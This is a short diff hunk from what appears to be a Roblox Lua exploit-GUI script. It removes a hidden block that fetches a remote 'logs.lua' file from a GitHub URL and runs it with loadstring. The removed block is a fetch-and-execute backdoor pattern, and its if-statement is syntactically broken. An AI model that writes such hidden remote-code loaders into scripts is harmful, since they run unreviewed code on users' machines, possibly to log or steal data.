@@ -1191,11 +1191,6 @@ local function C_75()
 
 
 	script.Parent.MouseLeave:Connect(unhover)
-	getgenv().logs = true
-	if logs = true then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/anyahubs/CommanderX/main/logs.lua", true))()
-	logs = false
-	end
 end;
 task.spawn(C_75);
 
